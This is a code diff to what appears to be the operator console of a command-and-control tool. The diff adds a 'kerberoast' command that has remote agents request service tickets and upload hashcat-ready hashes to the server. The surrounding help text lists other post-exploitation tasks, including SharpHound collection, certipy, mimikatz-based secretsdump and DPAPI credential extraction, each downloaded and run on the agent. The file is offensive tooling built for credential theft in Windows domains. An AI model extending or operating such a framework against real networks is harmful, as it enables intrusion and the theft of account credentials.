@@ -21,6 +21,8 @@ Interact mode  (prompt changes to [agent_id] >):
   recon <ip_or_cidr>                             — queue a recon scan
   sharphound                                     — download + run SharpHound, upload ZIP
   certipy <args>                                 — download certipy.exe + run, upload output files (ADCS enum)
+  kerberoast                                     — enumerate SPN accounts + request TGS tickets natively,
+                                                   output hashcat-ready $krb5tgs$ hashes, upload to server
   secretsdump <tool> <args>                      — download tool + run (e.g. mimikatz.exe args)
   dpapi <tool> <args>                            — download tool + run (e.g. SharpDPAPI.exe args)
   authenticate -u <user> -p <pass> [-s <svc>] [-c <cmd>] <target_ip>
@@ -641,6 +643,12 @@ def handle_interact(line, agent_id):
             if res:
                 print(f"[+] Certipy task queued — task_id: {res['task_id']}")
                 _wait_for_result(agent_id, res["task_id"], timeout=120)
+
+    elif cmd == "kerberoast":
+        res = _post("/task", {"agent_id": agent_id, "task_type": "kerberoast", "instruction": ""})
+        if res:
+            print(f"[+] Kerberoast task queued — task_id: {res['task_id']}")
+            _wait_for_result(agent_id, res["task_id"], timeout=120)
 
     elif cmd == "secretsdump":
         if not arg:
